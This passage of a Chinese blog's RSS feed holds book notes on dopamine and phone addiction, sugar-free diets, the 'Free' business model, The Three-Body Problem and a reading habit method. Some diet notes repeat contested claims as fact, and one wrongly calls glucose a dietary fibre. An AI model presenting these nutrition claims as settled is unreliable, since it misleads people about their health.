&lt;p&gt;大脑会努力维持快乐和痛苦的平衡。每当这个天平向一侧倾斜时，大脑就会在另外一侧施加压力，竭力恢复平衡，神经科学家称之为&lt;strong&gt;内稳态&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/books/005-%E6%88%90%E7%98%BE-%E5%9C%A8%E6%94%BE%E7%BA%B5%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%B9%B3%E8%A1%A1/atta/2024-11-18-19-27-19.png&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;多巴胺被释放以后，大脑会相应地减少或“下调”被刺激的多巴胺受体的数量，从而导致快乐-痛苦的天平向痛苦端倾斜，以恢复平衡。所以，我们常常会在快乐过后产生宿醉感或失落感。倘若等待足够长的时间，这种感觉就会消失，我们会重新回归中立的状态。然而，人类天生渴望对抗这种感觉，于是我们会再次回到那个快乐源泉的怀抱——比如再玩一局游戏&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;如果每天保持这种模式几个小时，几周或几个月后，大脑的快乐设定点就会发生变化。现在我们继续玩游戏，不是为了获得快乐，而是为了回到正常的感觉。一旦停下来，我们就会体验到戒断任何成瘾物质时会出现的普遍症状：焦虑、易怒、失眠、烦躁和强烈的渴求，一心想回到那个成瘾物质身边。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;有线一带的皮下注射器&#34;&gt;有线一带的&amp;quot;皮下注射器&amp;quot;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;并非人人都玩电子游戏，但几乎所有人都有一个令自己成瘾的数字化产品，其中很可能就包括智能手机——它相当于 &lt;strong&gt;“有线一代”(wired generation)的“皮下注射针”&lt;/strong&gt;。众所周知，要减少手机的使用是非常困难的，一旦离开手机，大脑的快乐-痛苦天平就会向痛苦的一侧倾斜，令人感到不安和暴躁。但这么做是值得的，因为若能保持足够长的时间不去使用手机，更加健康、平衡的多巴胺水平会带来诸多益处。大脑不再被渴求占据，我们才能更加专注于当下，再次从生活中那些微小的、意想不到的奖励中获得快乐&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/zh-cn/%E5%A4%9A%E5%B7%B4%E8%83%BA&#34;&gt;多巴胺&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>#4 糖中毒</title>
      <link>https://wdd.js.org/books/004-%E7%B3%96%E4%B8%AD%E6%AF%92/</link>
      <pubDate>Tue, 12 Nov 2024 14:02:00 +0800</pubDate>
      <guid>https://wdd.js.org/books/004-%E7%B3%96%E4%B8%AD%E6%AF%92/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;人类诞生在200万年前，工业革命诞生到现在不到200年。&lt;/p&gt;
&lt;p&gt;200相比于200万，几乎可以忽略不计。&lt;/p&gt;
&lt;p&gt;我们的身体，细胞，是两百万年的经历累积的结晶。在200万年的时间，我们从采集、狩猎获取食物，大部分时间处于饥饿状态，改变为从超市、菜市场、美食广场、在线商城中选购。&lt;/p&gt;
&lt;p&gt;就好像早上刚出生小牛，中午就开始吃红酒配法式鹅肝。&lt;/p&gt;
&lt;p&gt;身体变化不大，我们的饮食结构可以说在极短的时间发生了翻天覆地的变化。&lt;/p&gt;
&lt;p&gt;因此，也难怪三高、各种慢性病，全世界遍地开花、星火燎原。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;糖中毒&#34;&gt;&lt;strong&gt;《糖中毒》&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; 牧田善二&lt;/p&gt;
&lt;p&gt; 13个笔记&lt;/p&gt;
&lt;h3 id=&#34;了解糖分是什么就能轻松减肥&#34;&gt; &lt;strong&gt;了解糖分是什么，就能轻松减肥&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;大脑处于不由自主地想摄入米饭和面类食物等碳水化合物、无醇饮料￼、零食&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;在现代社会不上瘾是很难的&#34;&gt; &lt;strong&gt;在现代社会，不上瘾是很难的&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;两者的根源都是“大脑无法忘记快感”。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;为了大脑运转而摄取糖分是恶魔的谎言&#34;&gt; &lt;strong&gt;“为了大脑运转而摄取糖分”是恶魔的谎言&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;大脑的能量来源通常是葡萄糖。如果葡萄糖不足，则通过蛋白质和脂肪分解出来的氨基酸和甘油三酯来维持血糖值。但是如果继续禁食，血液中的酮体就会上升，大脑就会用酮体代替葡萄糖作为能量源&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第一章回顾&#34;&gt; &lt;strong&gt;第一章回顾&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;◎须知肥胖和糖中毒都是慢性病。 ◎让我们发胖的不是热量而是糖分。 ◎肥胖的原因是糖中毒，与意志和体质无关。 ◎了解糖分是什么并适当摄取，就能轻松减肥。 ◎蔬菜汁和果汁对身体有害。 ◎碳水化合物才是引起糖中毒的主要原因。 ◎记住了至福点的大脑，就像被糖控制了一样。 ◎如果没有意识到这一点，大多数人都会陷入糖中毒。 ◎即使葡萄糖不足，大脑也不会停止运转&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;奖励系统引起糖中毒的机制&#34;&gt; &lt;strong&gt;“奖励系统”——引起糖中毒的机制&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;所谓的糖中毒，就是由于大脑对糖分的反应机制，人们无法从这种循环中摆脱出来的一种状态。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;液态糖是一种魔鬼食品&#34;&gt; &lt;strong&gt;液态糖是一种魔鬼食品&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;血糖值一旦跌破70 mg/dL，就会出现不适症状，就会被迫按照大脑的指令摄取糖分&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;糖分使你发胖肥胖的机制&#34;&gt; &lt;strong&gt;糖分使你发胖——肥胖的机制&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;胰岛素先将血液中溢出的葡萄糖转化为糖原，储存在肝脏和肌肉中&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第二章回顾&#34;&gt; &lt;strong&gt;第二章回顾&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;糖分摄入的越多，大脑就越容易上瘾。 ◎烦躁易怒也可能是因为糖中毒。 ◎含有大量糖分的碳酸饮料和果汁简直就是魔鬼食品。 ◎糖中毒会加速衰老。 ◎糖中毒会导致糖尿病、高血压、癌症、心肌梗死、脑卒中、慢性肾病和阿尔茨海默病。 ◎糖分几乎百分之百会转化为葡萄糖，被人体全部吸收。 ◎吃脂质并不会变胖。 ◎减少脂质摄入量不能减肥，反而会危害健康。 ◎只要不停地吃碳水化合物，就永远也瘦不下来。 ◎男性肥胖特别危险，女性太瘦也不好。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;哪些食物不会导致血糖值升高&#34;&gt; &lt;strong&gt;哪些食物不会导致血糖值升高&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;蔬菜（不包括根茎类蔬菜）、蘑菇、海藻、豆类、肉类、鱼类、豆腐基本上不会导致血糖值升高&lt;/li&gt;
&lt;li&gt;米饭、面包等碳水化合物，薯类等含糖量高的根茎类蔬菜，南瓜等含糖量高的蔬菜，含糖量高的无醇饮料等，会导致血糖值大幅升高&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;最后再吃碳水化合物&#34;&gt; &lt;strong&gt;最后再吃碳水化合物&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;只要好好咀嚼，就能向大脑的饱腹中枢发出“吃了很多”的信号，最终就能减少碳水化合物的摄入量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;吃完后马上运动抵消刚刚吃进去的碳水化合物&#34;&gt; &lt;strong&gt;“吃完后马上运动”——抵消刚刚吃进去的碳水化合物&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;12秒深蹲”，特别适合那些没有时间运动的人。顾名思义，每次深蹲只需12秒。慢慢蹲下来，慢慢站起来，这个动作对大腿的负荷很大，效果很好。 这样做10次，就能抵消刚刚吃进去的碳水化合物。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第三章回顾&#34;&gt; &lt;strong&gt;第三章回顾&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;一辈子都不喝含糖的碳酸饮料、含糖的罐装咖啡等饮料&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 来自微信读书&lt;/p&gt;</description>
    </item>
    <item>
      <title>#3 戒糖 改变一生的科学饮食法</title>
      <link>https://wdd.js.org/books/003-%E6%88%92%E7%B3%96-%E6%94%B9%E5%8F%98%E4%B8%80%E7%94%9F%E7%9A%84%E7%A7%91%E5%AD%A6%E9%A5%AE%E9%A3%9F%E6%B3%95/</link>
      <pubDate>Tue, 12 Nov 2024 10:55:06 +0800</pubDate>
      <guid>https://wdd.js.org/books/003-%E6%88%92%E7%B3%96-%E6%94%B9%E5%8F%98%E4%B8%80%E7%94%9F%E7%9A%84%E7%A7%91%E5%AD%A6%E9%A5%AE%E9%A3%9F%E6%B3%95/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;戒糖，关键是理解两个字&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;戒&lt;/strong&gt;：应当理解为警戒，而不是戒除。完全戒除是不可能的&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;糖&lt;/strong&gt;：不能单纯的只理解为甜食、白砂糖之类的具有甜味的视频。具有甜味只是冰山一角的特征，更大的特征是碳水画合物。嘴巴舌头喜欢的东西，胃、小肠、小肠并不一定喜欢。就拿舌头喜欢的“甜、香、软、糯、鲜”来说，这部分都可以算作糖类。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;戒糖改变一生的科学饮食法&#34;&gt;&lt;strong&gt;《戒糖：改变一生的科学饮食法》&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; 初夏之菡&lt;/p&gt;
&lt;p&gt; 20个笔记&lt;/p&gt;
&lt;h3 id=&#34;戒糖戒掉的是什么&#34;&gt; &lt;strong&gt;戒糖戒掉的是什么？&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;“空热量”食物的概念很好理解，指除了能够给我们热量之外，没有其他已知的营养益处的食物，而游离糖正符合这一概念。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;高糖饮食对一生有害的习惯&#34;&gt; &lt;strong&gt;高糖饮食：对一生有害的习惯&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;戒糖是在备孕期间就应该着手养成的良好营养习惯之一。真正让孩子赢在起跑线上的，往往是妈妈的饮食和身体素质。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;生酮饮食真的健康吗&#34;&gt; &lt;strong&gt;“生酮饮食”真的健康吗？&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们的身体是不需要游离糖的。但是我们的心需要它，而且这种对甜的渴望并不是一种错&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;食品配料表营养成分表怎么读&#34;&gt; &lt;strong&gt;食品配料表、营养成分表怎么读？&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;，即每天需求2000千卡热量，蛋白质60克，脂肪60克，碳水化合物300克，钠2000毫克，然后按这几个数值的百分比来显示。&lt;/li&gt;
&lt;li&gt;每100克大米饭约含有26克碳水化合物&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;如何综合判断食品中的碳水化合物含量高低&#34;&gt; &lt;strong&gt;如何综合判断食品中的碳水化合物含量高低？&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;碳水化合物在食物中主要有三种形态：膳食纤维、淀粉以及游离&lt;/li&gt;
&lt;li&gt;所以膳食纤维是有能量效应的，它在营养学中统一的折算能量是每克2千卡，是可消化碳水化合物的50%。&lt;/li&gt;
&lt;li&gt;在热且湿润的食物中，淀粉的口感非常明显，就是“软乎”和“糯”&lt;/li&gt;
&lt;li&gt;蛋白质和淀粉的混合会让食物的口感更加绵软湿润，比如奶酪蛋糕&lt;/li&gt;
&lt;li&gt;我国国家标准规定“纯牛奶”只能含有新鲜牛乳，所以可以认为任何加了糖的乳制品都属于“调味乳&lt;/li&gt;
&lt;li&gt;葡萄糖是膳食纤维的一种）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进一步减少血糖波动吃的顺序很重要&#34;&gt; &lt;strong&gt;进一步减少血糖波动：吃的顺序很重要&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;2024/11/05 发表想法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先吃蔬菜，接着肉、蛋白、最后米饭&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;原文：最后吃碳水化合物丰富的食物&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最后吃碳水化合物丰富的食物&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;抗糖办法之运动与思考&#34;&gt; &lt;strong&gt;抗糖办法之运动与思考&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;2024/11/05 发表想法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;无论如何运动，都无法弥补过度进食造成的伤害。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;原文：过度进食造成的能量负载过度对我们百害而无一利。这一点从微观的能量代谢上来说就更加说得通了&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过度进食造成的能量负载过度对我们百害而无一利。这一点从微观的能量代谢上来说就更加说得通了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;所以只有适量地吃、适当地动才是平衡的养生之道。而适量的确是个很难把握的度，但是只要听从你的身体和内心，&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第10章-戒糖的另一种方式轻断食&#34;&gt; &lt;strong&gt;第10章 戒糖的另一种方式：轻断食&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;[插图]&lt;/li&gt;
&lt;li&gt;•  “5+2”模式：这个也是麦克尔·莫斯利博士提出的一个改良方法，即以周为单位，选择任意2天（可以不连续）进行热量限制饮食——只吃平时热量的1/4，其他5天正常进食。&lt;/li&gt;
&lt;li&gt;•  禁止加餐模式：&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;戒糖的终极动力来源&#34;&gt; &lt;strong&gt;戒糖的终极动力来源&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;那些充满游离糖和快消化碳水化合物的食物，一般是“甜、香、软、糯”必占其一的食物，&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 来自微信读书&lt;/p&gt;</description>
    </item>
    <item>
      <title>#2 免费 - 商业的未来</title>
      <link>https://wdd.js.org/books/002-%E5%85%8D%E8%B4%B9---%E5%95%86%E4%B8%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/</link>
      <pubDate>Tue, 12 Nov 2024 10:30:00 +0800</pubDate>
      <guid>https://wdd.js.org/books/002-%E5%85%8D%E8%B4%B9---%E5%95%86%E4%B8%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/books/002-%E5%85%8D%E8%B4%B9---%E5%95%86%E4%B8%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/atta/2024-11-12-10-49-44.png&#34;&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;在看这本书之前，我知道有以下几种免费的方式。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;广告&lt;/strong&gt;：你在B站、油管上看视频不用花钱，但是视频的中间、或者播放器的横幅广告，都是需要广告主付费。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;增值服务&lt;/strong&gt;：你在玩王者荣耀时，基本是免费的。但是王者荣耀的年收入却十几亿美元，假如王者里80%的用户是不付钱的，另外20%是付费用户。也就是说是由20%的付费用户承担了成本，那么他们理应拥有更好看的服装和道具，甚至更好看的胜率。所以，作为白嫖用户，你应该要有自知之明。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;版本差异&lt;/strong&gt;：比如软件有基础版本，功能虽然够用，但是也有各种限制。想要更好的服务，需要升级到pro版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配额差异&lt;/strong&gt;：例如某个软件，30用户以内免费，超过30人则收费。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;时间限制&lt;/strong&gt;：
&lt;ol&gt;
&lt;li&gt;在固定的时间范围内免费，例如免费可以用一年，超过一年则需要付费&lt;/li&gt;
&lt;li&gt;开始免费，用来培养用户习惯，培养韭菜，占领市场，等未来某个时间点再收费&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;试吃试穿&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;比如，用付费产品来补贴免费产品，用日后付费来补贴当前免费，由付费人群来给不付费人群提供补贴。&lt;/li&gt;
&lt;li&gt;用免费的产品和服务去吸引用户，然后再用增值服务或其他产品收费，已经成为互联网公司的普遍成长规律。&lt;/li&gt;
&lt;li&gt;用户。通常而言，一家网站会遵循“ 5%定律”，也就是说 5%的付费用户是网站的所有收入来源。&lt;/li&gt;
&lt;li&gt;伍德沃德明白“免费”这个字眼能重塑顾客心态、创造新市场、打破旧习并让所有产品看上去具有更加吸引人的独特魅力。&lt;/li&gt;
&lt;li&gt;林林总总的免费归根结底都表现为同一实质—让钱在不同的产品之间、人之间、现在和未来之间、不与钱打交道的市场和回到金钱市场之间转移。&lt;/li&gt;
&lt;li&gt;经济学家把它称做“交叉补贴”（ cross-subsidies）。&lt;/li&gt;
&lt;li&gt;但是当某样商品免费时，你就忘记了它的坏处了。&lt;/li&gt;
&lt;li&gt;丈夫会有一种矛盾心态，觉得和她一起过不下去，但是离开她自己又过不下去。&lt;/li&gt;
&lt;li&gt;科幻小说之所以引人入胜，就在于它揭示了人类对这种大错位会作何反应。&lt;/li&gt;
&lt;li&gt;文化。换句话说，匮乏的终结使我们变得懒惰、颓废、愚蠢和卑鄙。&lt;/li&gt;
&lt;li&gt;我们始终被自己不曾拥有的而非已经拥有的事物激励着。&lt;/li&gt;
&lt;li&gt;悲痛5阶段 我们最好是通过心理学家伊丽莎白·库伯勒·罗斯提出的“悲痛五阶段”理论来解释
&lt;ul&gt;
&lt;li&gt;否认&lt;/li&gt;
&lt;li&gt;愤怒&lt;/li&gt;
&lt;li&gt;商讨&lt;/li&gt;
&lt;li&gt;绝望&lt;/li&gt;
&lt;li&gt;接纳&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>#1 三体全集</title>
      <link>https://wdd.js.org/books/001-%E4%B8%89%E4%BD%93/</link>
      <pubDate>Tue, 12 Nov 2024 10:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/books/001-%E4%B8%89%E4%BD%93/</guid>
      <description>&lt;p&gt;最近刚好有时间，再次读了一遍《三体》，相比第一次惊讶于科幻概念的设定，这次更加关注文学性方面的东西。&lt;/p&gt;
&lt;p&gt;具体而言，就是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;白蓉说：“你的方法不对，你是在作文，不是在创造文学形象。要知道，&lt;strong&gt;一个文学人物十分钟的行为，可能是她十年的经历的反映&lt;/strong&gt;。你不要局限于小说的情节，要去想象她的整个生命，而真正写成文字的，只是冰山的一角。”
&amp;mdash; 刘慈欣. 《三体全集》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;我想起了我初中时写过的一篇小说，当时也写了至少有十几页，故事的内容大概是描写一个频繁整容的人所遇到的各种经历。&lt;/p&gt;
&lt;p&gt;我专注描写于人物当时的感受，当时的经历，却忽略的她的历史。&lt;/p&gt;
&lt;p&gt;现在想来，一个人之所以是现在的样子，现在的思想，往往是他10年，或者一辈子经验的累积结果。&lt;/p&gt;
&lt;p&gt;她之所以整容，可能要往前推10年。&lt;/p&gt;
&lt;p&gt;可能和她在学校的经历有关，比如在外貌上收到霸凌或者嘲笑，导致她的自尊心收到伤害。&lt;/p&gt;
&lt;p&gt;可能受到环境的影响，例如家庭或者工作环境，都存在整容的人，导致她自己也有整容的想法。&lt;/p&gt;
&lt;p&gt;可能社交媒体的宣传有关，导致她有医美的想法。&lt;/p&gt;
&lt;p&gt;在众多的可能性中，要选择合适的可能性，塑造人物的行动的动机。&lt;/p&gt;
&lt;p&gt;总之，在构思文学人物形象时，务必能将她的时间线先前或者向后探索10年。 这里除了&amp;quot;白蓉&amp;quot;所说的向前的10年探索，其实也可以向后探索。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;多年以后，面对行刑队，奥雷里亚诺·布恩迪亚上校将会回想起父亲带他去见识冰块的那个遥远的下午
百年孤独&lt;/p&gt;&lt;/blockquote&gt;
&lt;div class=&#34;notice info&#34;&gt;
  &lt;div class=&#34;notice-title&#34;&gt;
    &lt;i class=&#34;fa fa-exclamation-circle&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info
  &lt;/div&gt;
  &lt;div class=&#34;notice-content&#34;&gt;&lt;p&gt;&lt;img alt=&#34;三体全集&#34; loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/books/001-%E4%B8%89%E4%BD%93/atta/s33460607.jpg#float-end&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在中国，任何超脱飞扬的思想都会砰然坠地的，现实的引力太沉重了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;那么，还有多少在自己看来是正常甚至正义的人类行为是邪恶的呢？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;要做到这一点，只有借助于人类之外的力量。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;稍后，有人报告说牛顿爵士偷了一匹快马去向不明。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;于是，她在名义上还是将研究进行下去，实际上则潜心搞自己的太阳数学模型。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;中国的高储蓄率是一颗大地雷，怎么着，说对了吧？高储蓄，低社保，老百姓存在银行里的钱就成了命根儿，一有风吹草动当然会产生群体性恐慌。”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果你的城府真够深，那就不能显示出任何城府来，和电影上看到的不同，真正老谋深算的人不是每天阴着脸装那副鸟样儿，他们压根儿就不显出用脑子的样儿来&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最高的境界是让他们根本注意不到你，就当你不存在，直到他们死在你手里前的一刹那才回过味来。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个文学人物十分钟的行为，可能是她十年的经历的反映。你不要局限于小说的情节，要去想象她的整个生命，而真正写成文字的，只是冰山的一角。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;中世纪和大低谷的事实都证明，专制制度是人类发展的最大障碍，星舰地球需要活跃的新思想和创造力，这只有通过建立一个充分尊重人性和自由的社会才能做到。”&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 来自微信读书&lt;/p&gt;&lt;/div&gt;
&lt;/div&gt;</description>
    </item>
    <item>
      <title>#0 百分之一阅读方法</title>
      <link>https://wdd.js.org/books/000-%E7%99%BE%E5%88%86%E4%B9%8B%E4%B8%80/</link>
      <pubDate>Tue, 12 Nov 2024 09:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/books/000-%E7%99%BE%E5%88%86%E4%B9%8B%E4%B8%80/</guid>
      <description>&lt;p&gt;几年前，也许是在我参加工作的第一年。&lt;/p&gt;
&lt;p&gt;那时候，亚马逊还没有退出中国。最大的阅读买书的应用是亚马逊书城，最方便的读书会员会员是kindle unlimit。&lt;/p&gt;
&lt;p&gt;买kindle的unlimit的会员，就可以借阅亚马逊书城里几乎所有的书。&lt;/p&gt;
&lt;p&gt;那一年，我为了增加自己的知识与眼界，也为了消磨一些无聊的时间，我买了kindle pw4。&lt;/p&gt;
&lt;p&gt;我给自己制定了一个小的读书计划。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每天至少读一本书的1%&lt;/strong&gt;，每天读至少五本书。&lt;/p&gt;
&lt;p&gt;我当时还用excel记录了每天，每本书的阅读进度。这种习惯持续了半年左右，直到我做手术时才终止。&lt;/p&gt;
&lt;p&gt;当我回首那段读书时间后，在不知不觉中，我竟然读完了一百多本书。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;半年时间我读的书，要比我大学四年读的书还要多。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;分析原因，则总结出以下三点&lt;/p&gt;
&lt;h2 id=&#34;1-量化&#34;&gt;1. 量化&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;量化&lt;/strong&gt;：每次读书，至少要读百分之一。当然这只是一个理论值，最低的限度是至少翻一页。因为有些非常厚的书，即使是百分之一，一天之内也是很难读完的。例如《权利的游戏全集》英文版，我几乎每天都看，看了一周之后，再看看进度，还是不足百分之一。&lt;/p&gt;
&lt;h2 id=&#34;2-观测&#34;&gt;2. 观测&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;观测&lt;/strong&gt;：就是需要记录读书的进度，因为只有能观测到阅读的进度，才会比较容易发现时间的累积效果，才会有目标。简单的方法你可以用个excel, 每天记录进度。&lt;/p&gt;
&lt;p&gt;例如如下表格：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;书名&lt;/th&gt;
          &lt;th&gt;08-04(周一)&lt;/th&gt;
          &lt;th&gt;05&lt;/th&gt;
          &lt;th&gt;06&lt;/th&gt;
          &lt;th&gt;07&lt;/th&gt;
          &lt;th&gt;08&lt;/th&gt;
          &lt;th&gt;09&lt;/th&gt;
          &lt;th&gt;10&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;三体&lt;/td&gt;
          &lt;td&gt;5%&lt;/td&gt;
          &lt;td&gt;6%&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;百年孤独&lt;/td&gt;
          &lt;td&gt;20%&lt;/td&gt;
          &lt;td&gt;22%&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;3-放弃&#34;&gt;3. 放弃&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;放弃&lt;/strong&gt;：人在选书，书也在选人。有时候，一本书读了一小部分，发现读之无味，不读又觉得不该中途放弃。这时候，你应该放弃继续读这本书，把它放到一边，选择其他的书来看。&lt;/p&gt;
&lt;h2 id=&#34;4-坚持&#34;&gt;4. 坚持&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;坚持&lt;/strong&gt;：一件事情，即使再困难，只要能坚持两周以上，就会形成习惯。一旦形成习惯，困难度就会显著降低。 以前我学车的时候，每天都要五点起床，去驾校学车。刚开始第一天，五点起床，被窝里仿佛是个黑洞漩涡，而我必要要有一个逃逸速度才能不被黑洞拉进去。 然而坚持一周之后，学车结束了，开始正常上班，我发现我也能很自然的在五点起床。 所以，不要以为百分之一很小，也不要以为阅读很难，自己先试试，看看两周之后的结果。&lt;/p&gt;
&lt;h2 id=&#34;5-针对性&#34;&gt;5. 针对性&lt;/h2&gt;
&lt;p&gt;对于不同类型的书，读书方法也不同，这里推荐大家看看《如何阅读一本书》&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/books/000-%E7%99%BE%E5%88%86%E4%B9%8B%E4%B8%80/atta/2024-11-12-09-57-38.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>第二份工作的辞职总结</title>
